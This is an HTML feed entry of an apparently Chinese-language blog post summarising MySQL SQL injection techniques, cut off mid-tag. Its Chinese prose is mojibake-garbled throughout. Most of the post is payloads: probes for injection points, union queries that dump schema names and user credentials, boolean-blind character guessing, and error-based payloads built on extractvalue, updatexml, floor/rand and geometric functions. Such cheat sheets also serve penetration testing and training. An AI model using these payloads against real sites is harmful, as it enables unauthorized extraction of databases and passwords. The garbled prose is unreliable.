    <content type="html"><![CDATA[<h1 id="sqlæ³¨å…¥æ€»ç»“"><a href="#sqlæ³¨å…¥æ€»ç»“" class="headerlink" title="sqlæ³¨å…¥æ€»ç»“"></a>sqlæ³¨å…¥æ€»ç»“</h1><p>2021/4/19 é¦–å‘</p><p>2021/5/29 å¯¹æŠ¥é”™æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ã€bypassæœ‰æ‰€è¡¥å……ï¼Œæ–°å¢å®½å­—èŠ‚æ³¨å…¥</p><h1 id="0x00æ³¨å…¥åŸç†"><a href="#0x00æ³¨å…¥åŸç†" class="headerlink" title="0x00æ³¨å…¥åŸç†"></a>0x00æ³¨å…¥åŸç†</h1><p>SQLæ³¨å…¥ä¸»è¦é€šè¿‡é—­åˆå­—ç¬¦ä¸²ï¼Œæ³¨é‡Šåç»­æœ¬æ¥ä¸ºå‘½ä»¤çš„ä¸€éƒ¨åˆ†å­—ç¬¦æ”¹å˜ä¸ºæ–‡æœ¬çš„æ–¹å¼æ¥å¯¹sqlè¯­å¥è¿›è¡Œæ‹¼æ¥è¾¾åˆ°æ‰§è¡Œä»»æ„sqlå‘½ä»¤çš„ç›®çš„</p><p>SQLæ³¨å…¥å¼æ”»å‡»çš„ä¸»è¦å½¢å¼æœ‰ä¸¤ç§ã€‚ä¸€æ˜¯ç›´æ¥å°†ä»£ç æ’å…¥åˆ°ä¸SQLå‘½ä»¤ä¸²è”åœ¨ä¸€èµ·å¹¶ä½¿å¾—å…¶ä»¥æ‰§è¡Œçš„ç”¨æˆ·è¾“å…¥å˜é‡ã€‚äºŒæ˜¯ä¸€ç§é—´æ¥çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå°†æ¶æ„ä»£ç æ³¨å…¥è¦åœ¨è¡¨ä¸­å­˜å‚¨æˆ–è€…ä½œä¸ºåŸä¹¦æ®å­˜å‚¨çš„å­—ç¬¦ä¸²ã€‚åœ¨å†æ¬¡æŸ¥è¯¢æ—¶ï¼Œå­˜å‚¨çš„å­—ç¬¦ä¸²ä¼šè¿æ¥åˆ°ä¸€ä¸ªSQLå‘½ä»¤ä¸­ï¼Œæ‰§è¡Œä¸€äº›æ³¨å…¥è€…æƒ³è¦çš„æ¶æ„çš„QLä»£ç (è¿™ç§æ³¨å…¥æ–¹å¼ä¸€èˆ¬è¢«ç§°ä¸ºäºŒæ¬¡æ³¨å…¥)ã€‚</p><h1 id="0x01æ³¨å…¥ç±»å‹çš„åˆ¤æ–­"><a href="#0x01æ³¨å…¥ç±»å‹çš„åˆ¤æ–­" class="headerlink" title="0x01æ³¨å…¥ç±»å‹çš„åˆ¤æ–­"></a>0x01æ³¨å…¥ç±»å‹çš„åˆ¤æ–­</h1><h2 id="æŒ‰å˜é‡ç±»å‹åˆ†ç±»"><a href="#æŒ‰å˜é‡ç±»å‹åˆ†ç±»" class="headerlink" title="æŒ‰å˜é‡ç±»å‹åˆ†ç±»"></a>æŒ‰å˜é‡ç±»å‹åˆ†ç±»</h2><h3 id="æ•°å­—å‹"><a href="#æ•°å­—å‹" class="headerlink" title="æ•°å­—å‹"></a>æ•°å­—å‹</h3><p>å¯ä»¥è¿›è¡Œ?id=3-1è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœå›æ˜¾ç»“æœæ˜¯?id=2çš„å›æ˜¾çš„è¯ï¼Œé‚£è¯´æ˜æ³¨å…¥ç‚¹ä¸ºæ•°å­—å‹</p><h3 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h3><p>å¯ä»¥è¿›è¡Œ?id=2aè¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœå›æ˜¾ç»“æœæ˜¯?id=2çš„å›æ˜¾çš„è¯ï¼Œé‚£è¯´æ˜æ³¨å…¥ç‚¹ä¸ºå­—ç¬¦å‹</p><h1 id="0x02åˆ¤æ–­åå°æ•°æ®åº“ç§ç±»"><a href="#0x02åˆ¤æ–­åå°æ•°æ®åº“ç§ç±»" class="headerlink" title="0x02åˆ¤æ–­åå°æ•°æ®åº“ç§ç±»"></a>0x02åˆ¤æ–­åå°æ•°æ®åº“ç§ç±»</h1><p>å…¶ä¸­mysqlæœ€ä¸ºå¸¸è§</p><h3 id="æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°"><a href="#æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°" class="headerlink" title="æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°"></a><strong>æ ¹æ®æ“ä½œç³»ç»Ÿå¹³å°</strong></h3><p><strong>sql server</strong>ï¼šWindowsï¼ˆIIS)</p><p><strong>MySQL</strong>ï¼šApache</p><h3 id="æ ¹æ®webè¯­è¨€"><a href="#æ ¹æ®webè¯­è¨€" class="headerlink" title="æ ¹æ®webè¯­è¨€"></a><strong>æ ¹æ®webè¯­è¨€</strong></h3><p><strong>Microsoft SQL Server</strong>ï¼šASPå’Œ.Net</p><p><strong>MySQL</strong>ï¼šPHP</p><p><strong>Oracle/MySQL</strong>ï¼šjava</p><p>ä»¥ä¸‹ä»¥mysqlæ•°æ®åº“ä¸ºä¸»</p><h1 id="0x03æ‰‹å·¥æ³¨å…¥"><a href="#0x03æ‰‹å·¥æ³¨å…¥" class="headerlink" title="0x03æ‰‹å·¥æ³¨å…¥"></a>0x03æ‰‹å·¥æ³¨å…¥</h1><p>MySQLç‰ˆæœ¬å¤§äº5.0å’Œå°äº5.0çš„æ³¨å…¥æµç¨‹åŒºåˆ«æ¯”è¾ƒå¤§ï¼Œä¸‹åˆä¸»è¦ä»¥å¤§äº5.0ç‰ˆæœ¬ä¸ºä¸»</p><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><p>ä¿¡æ¯æ•°æ®åº“</p><p><strong>information_schemaï¼ˆafter mysql 5.0)</strong></p><p>ç³»ç»Ÿæ•°æ®åº“ï¼Œè®°å½•å½“å‰æ•°æ®åº“çš„æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ—ï¼Œç”¨æˆ·æƒé™ç­‰ä¿¡æ¯</p><p><strong>SCHEMATA</strong></p><p>å‚¨å­˜mysqlæ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®åº“åï¼Œç¼–ç ç±»å‹è·¯å¾„ç­‰</p><p><strong>TABLES</strong></p><p>å‚¨å­˜mysqlä¸­çš„è¡¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿™ä¸ªè¡¨æ˜¯åŸºæœ¬è¡¨è¿˜æ˜¯ç³»ç»Ÿè¡¨ï¼Œæ•°æ®åº“çš„å¼•æ“æ˜¯ä»€ä¹ˆï¼Œè¡¨æœ‰å¤šå°‘è¡Œï¼Œåˆ›å»ºæ—¶é—´ï¼Œæœ€åæ›´æ–°æ—¶é—´ç­‰</p><p><strong>COLUMNS</strong></p><p>å‚¨å­˜mysqlä¸­è¡¨çš„åˆ—ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿™ä¸ªè¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ï¼Œè¯¥åˆ—æ˜¯è¡¨ä¸­çš„ç¬¬å‡ åˆ—ï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œåˆ—çš„ç¼–ç ç±»å‹ï¼Œåˆ—çš„æƒé™ï¼Œåˆ—çš„æ³¨é‡Šç­‰</p><p><strong>length(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸²strçš„é•¿åº¦</p><p><strong>substr(str, pos, len)</strong> ï¼šå°†strä»posä½ç½®å¼€å§‹æˆªå–lené•¿åº¦çš„å­—ç¬¦è¿›è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»1å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„0å¼€å§‹</p><p><strong>mid(str,pos,len)</strong> ï¼šè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸²</p><p><strong>ascii(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼</p><p><strong>ord(str)</strong> ï¼šå°†å­—ç¬¦æˆ–å¸ƒå°”ç±»å‹è½¬æˆascllç </p><p><strong>if(a,b,c)</strong> ï¼šaä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›bï¼Œå¦åˆ™è¿”å›cï¼Œå¦‚if(1&gt;2,1,0),è¿”å›0</p><h2 id="åŸºæœ¬æµç¨‹æ€è·¯"><a href="#åŸºæœ¬æµç¨‹æ€è·¯" class="headerlink" title="åŸºæœ¬æµç¨‹æ€è·¯"></a>åŸºæœ¬æµç¨‹æ€è·¯</h2><h3 id="1-åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#1-åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="1.åˆ¤æ–­æ³¨å…¥ç‚¹"></a>1.åˆ¤æ–­æ³¨å…¥ç‚¹</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ•°å­—å‹ï¼šid<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br><span class="line">å­—ç¬¦å‹ï¼š<span class="string">&#x27; ã€&#x27;</span>)ã€ <span class="string">&#x27;))ã€ &quot;ã€ &quot;)ã€ &quot;))</span></span><br><span class="line"><span class="string">æ³¨é‡Šç¬¦ï¼š-- ï¼ˆè¿™æ˜¯--ç©ºæ ¼ï¼‰ã€--+ã€/**/ã€#</span></span><br></pre></td></tr></table></figure><h3 id="2-è·å–å­—æ®µæ•°å’Œè§‚å¯Ÿé¡µé¢å›æ˜¾çš„å­—æ®µå¤„"><a href="#2-è·å–å­—æ®µæ•°å’Œè§‚å¯Ÿé¡µé¢å›æ˜¾çš„å­—æ®µå¤„" class="headerlink" title="2.è·å–å­—æ®µæ•°å’Œè§‚å¯Ÿé¡µé¢å›æ˜¾çš„å­—æ®µå¤„"></a>2.è·å–å­—æ®µæ•°å’Œè§‚å¯Ÿé¡µé¢å›æ˜¾çš„å­—æ®µå¤„</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n</span><br></pre></td></tr></table></figure><h3 id="3-è·å–æ•°æ®åº“å"><a href="#3-è·å–æ•°æ®åº“å" class="headerlink" title="3.è·å–æ•°æ®åº“å"></a>3.è·å–æ•°æ®åº“å</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,database() </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information schema.schemata),</span><br></pre></td></tr></table></figure><h3 id="4-è·å–è¡¨å"><a href="#4-è·å–è¡¨å" class="headerlink" title="4.è·å–è¡¨å"></a>4.è·å–è¡¨å</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="5-è·å–è¡¨ä¸­çš„å­—æ®µ"><a href="#5-è·å–è¡¨ä¸­çš„å­—æ®µ" class="headerlink" title="5.è·å–è¡¨ä¸­çš„å­—æ®µ"></a>5.è·å–è¡¨ä¸­çš„å­—æ®µ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxxxxxx&#x27;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="6-è·å–å„ä¸ªå­—æ®µçš„å…·ä½“å€¼"><a href="#6-è·å–å„ä¸ªå­—æ®µçš„å…·ä½“å€¼" class="headerlink" title="6.è·å–å„ä¸ªå­—æ®µçš„å…·ä½“å€¼"></a>6.è·å–å„ä¸ªå­—æ®µçš„å…·ä½“å€¼</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> xxxxxxx</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span>(<span class="keyword">select</span> group_concat(id,<span class="string">&#x27;~&#x27;</span>,uname)<span class="keyword">from</span> test.users),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="å¸¸è§çš„æ³¨å…¥æ–¹æ³•"><a href="#å¸¸è§çš„æ³¨å…¥æ–¹æ³•" class="headerlink" title="å¸¸è§çš„æ³¨å…¥æ–¹æ³•"></a>å¸¸è§çš„æ³¨å…¥æ–¹æ³•</h2><h3 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h3><p>ä¸»è¦ç”¨äºæ³¨é‡Šåç»­ä»£ç ä¸ºæ³¨é‡Šæ–‡æœ¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">--(ç©ºæ ¼)æˆ–--+</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/*!...*/</span></span><br></pre></td></tr></table></figure><h3 id="unionæ³¨å…¥"><a href="#unionæ³¨å…¥" class="headerlink" title="unionæ³¨å…¥"></a>unionæ³¨å…¥</h3><p><strong>user() ï¼š</strong>å½“å‰ä½¿ç”¨è€…çš„ç”¨æˆ·å</p><p><strong>database()ï¼š</strong>å½“å‰æ•°æ®åº“å</p><p><strong>version()ï¼š</strong>æ•°æ®åº“ç‰ˆæœ¬</p><p><strong>datadirï¼š</strong>è¯»å–æ•°æ®åº“çš„ç»å¯¹è·¯å¾„<strong>@@vasedirï¼š</strong>mysqlå®‰è£…è·¯å¾„<strong>@@version_compile_osï¼š</strong>æ“ä½œç³»ç»Ÿ<strong>concat()ï¼š</strong>è¿æ¥ä¸€ä¸ªæˆ–è€…å¤šä¸ªå­—ç¬¦ä¸²<strong>group_concat()ï¼š</strong>è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">xx<span class="string">&#x27; union select 1,(select database()) #</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> database()),<span class="number">2</span> <span class="keyword">or</span> <span class="string">&#x27;ã€€ã€€ã€€ã€€ã€€ã€€//è¿™é‡Œå¦‚æœæŠŠæŸ¥è¯¢è¯­å¥æ”¾åˆ°2çš„ä½ç½®ä¸Šï¼Œå› ä¸ºorçš„å…³ç³»ä¼šä¸èƒ½æ˜¾ç¤ºæ­£å¸¸æŸ¥è¯¢çš„å†…å®¹</span></span><br></pre></td></tr></table></figure><h3 id="å¸ƒå°”æ³¨å…¥"><a href="#å¸ƒå°”æ³¨å…¥" class="headerlink" title="å¸ƒå°”æ³¨å…¥"></a>å¸ƒå°”æ³¨å…¥</h3><p>å½“æŸ¥è¯¢é¡µé¢ä¼šæ ¹æ®æŸ¥è¯¢çš„æˆåŠŸå’Œå¤±è´¥å‡ºç°ä¸¤ç§ä¸åŒé¡µé¢æ—¶å¯ä»¥è€ƒè™‘ä½¿ç”¨boolæ³¨å…¥</p><p><strong>å¸¸ç”¨å‡½æ•°</strong></p><p>1.char() è§£ASCIIç ;</p><p>2.mid()æˆªå–å­—ç¬¦ä¸²;</p><p>ä¸¾ä¾‹ï¼šmid(â€˜helloâ€™,1,3)ï¼Œä»ç¬¬1ä½å¼€å§‹æˆªå–3ä½ï¼Œè¾“å‡ºä½hel</p><p>3.substr()ä¸mid()ç›¸åŒï¼Œéƒ½ä¸ºæˆªå–å­—ç¬¦ä¸²;</p><p>4.count()è®¡ç®—æŸ¥è¯¢ç»“æœçš„è¡Œæ•°;</p><p>5.concat()æŸ¥è¯¢ç»“æœåˆå¹¶ä½†ä¿æŒåŸæœ‰è¡Œæ•°;</p><p>6.group_concat()æŸ¥è¯¢ç»“æœåˆå¹¶ä½†éƒ½æ”¾åœ¨ä¸€è¡Œä¸­;</p><p>7.ascii() æŸ¥è¯¢asciiç ;</p><p>çŒœæ•°æ®åº“é•¿åº¦(åˆ©ç”¨äºŒåˆ†æ³•);</p><ul><li>id=1 and (length(database()))&gt;1</li><li>id=1 and (length(database()))&gt;50</li></ul><p>çŒœç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨</p><ul><li>and ascii(mid(database(),1,1))&gt;1</li><li>and ascii(mid(database(),2,1))&gt;1</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨å;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">1</span><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">10</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> length(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢è¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢atelierè¡¨é‡Œæœ‰å‡ ä¸ªå­—æ®µ;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="built_in">count</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;atelier&#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> database())<span class="operator">&gt;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç¬¬ä¸€ä¸ªå­—æ®µé•¿åº¦;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;atelier&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span> database()limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µç¬¬ä¸€ä¸ªå­—ç¬¦;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;db83231_asfaa&#x27;</span> <span class="keyword">and</span> TABLE_NAME <span class="operator">=</span><span class="string">&#x27;atelier&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">105</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µæ‰€æœ‰è¡Œæ•°;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> db83231_asfaa.atelier)<span class="operator">&gt;</span><span class="number">4</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µåçš„è¡Œæ•°ï¼ˆæŸ¥è¯¢emailsè¡¨ï¼Œunameå­—æ®µï¼‰;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(uname)<span class="keyword">from</span> security.emails)<span class="operator">&gt;</span><span class="number">7</span> æŸ¥è¯¢unameçš„è¡Œæ•°</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µå†…å®¹;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length((<span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">10</span>ascii(mid((<span class="keyword">select</span> username <span class="keyword">from</span> security.user limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>å‰ææ˜¯åç«¯æœ‰Exceptionè¿™ç§å¼‚å¸¸å¤„ç†çš„å›æ˜¾æ‰èƒ½ä½¿ç”¨ï¼Œä¸ç„¶å³ä½¿èƒ½æŠ¥é”™ä½ ä¹Ÿçœ‹ä¸åˆ°å›æ˜¾ã€‚</p><h4 id="floor-å’Œrand"><a href="#floor-å’Œrand" class="headerlink" title="floor()å’Œrand()"></a><strong>floor()å’Œrand()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="number">2</span>,concat(<span class="string">&#x27;:&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;:&#x27;</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a       <span class="comment">/*åˆ©ç”¨é”™è¯¯ä¿¡æ¯å¾—åˆ°å½“å‰æ•°æ®åº“å*/</span></span><br></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a><strong>extractvalue()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a><strong>updatexml()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a><strong>geometrycollection()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a><strong>multipoint()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a><strong>polygon()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a><strong>multipolygon()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a><strong>linestring()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a><strong>multilinestring()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span 